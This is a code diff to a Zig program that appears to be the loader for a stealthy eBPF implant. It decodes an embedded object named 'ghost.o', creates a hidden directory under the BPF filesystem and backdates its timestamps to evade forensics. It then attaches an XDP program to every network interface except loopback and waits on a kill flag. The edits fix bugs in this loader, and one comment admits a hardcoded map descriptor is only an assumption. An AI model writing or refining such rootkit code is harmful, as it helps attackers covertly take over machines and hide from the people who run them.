@@ -4,7 +4,10 @@ const sc = @import("syscalls.zig");
 const SEED: u32 = 0x0;
 
 export fn _start() noreturn {
-    var b = @constCast(@embedFile("../target/ghost.o").*);
+    // CRITICAL: Copy to stack because @embedFile is read-only memory
+    const ghost_data = @embedFile("../target/ghost.o");
+    var b_buf: [ghost_data.len]u8 = ghost_data.*;
+    var b = &b_buf;
     
     var k = SEED;
     for (0..b.len) |i| {
@@ -20,6 +23,7 @@ export fn _start() noreturn {
 
     _ = sc.mount("none", "/sys/fs/bpf", "bpf", 0, null);
     _ = sc.mkdir("/sys/fs/bpf/.srv", 0o700);
+    
     const ts = [_]i64{ 1704067200, 0, 1704067200, 0 };
     _ = sc.utimensat(-100, "/sys/fs/bpf/.srv", &ts, 0);
 
@@ -34,10 +38,12 @@ export fn _start() noreturn {
         attach_all(@intCast(fd));
         
         var kill_flag: u32 = 0;
+        const key: u32 = 0;
         while (kill_flag == 0) {
+            // Note: map_fd 2 is an assumption; usually requires BPF_MAP_CREATE
             _ = sc.bpf_syscall(1, &sc.bpf_attr_map_op{
-                .map_fd = @intCast(fd), 
-                .key = @intFromPtr(&@as(u32, 0)),
+                .map_fd = 2, 
+                .key = @intFromPtr(&key),
                 .value = @intFromPtr(&kill_flag),
             }, 32);
             sc.nanosleep(5);
@@ -61,6 +67,7 @@ fn attach_all(prog_fd: i32) void {
         const name = std.mem.span(@as([*:0]const u8, @ptrCast(&entry.d_name)));
         if (!std.mem.eql(u8, name, ".") and !std.mem.eql(u8, name, "..") and !std.mem.eql(u8, name, "lo")) {
             const idx = get_idx(name);
+            // Native XDP (flags=2) then Generic (flags=0)
             if (sc.bpf_syscall(14, &sc.bpf_attr_link{ .prog_fd = @intCast(prog_fd), .target_ifindex = idx, .attach_type = 37, .flags = 2 }, 48) != 0) {
                 _ = sc.bpf_syscall(14, &sc.bpf_attr_link{ .prog_fd = @intCast(prog_fd), .target_ifindex = idx, .attach_type = 37, .flags = 0 }, 48);
             }
@@ -86,7 +93,7 @@ fn parse(blob: []u8) struct { offset: u64, size: u64 } {
     const shentsize = @as(*u16, @ptrFromInt(@intFromPtr(blob.ptr) + 58)).*;
     for (0..shnum) |i| {
         const ptr = @intFromPtr(blob.ptr) + shoff + (i * shentsize);
-        if (@as(*u32, @ptrFromInt(ptr + 4)).* == 1) {
+        if (@as(*u32, @ptrFromInt(ptr + 4)).* == 1) { // SHT_PROGBITS
             return .{ .offset = @as(*u64, @ptrFromInt(ptr + 24)).*, .size = @as(*u64, @ptrFromInt(ptr + 32)).* };
         }
     }
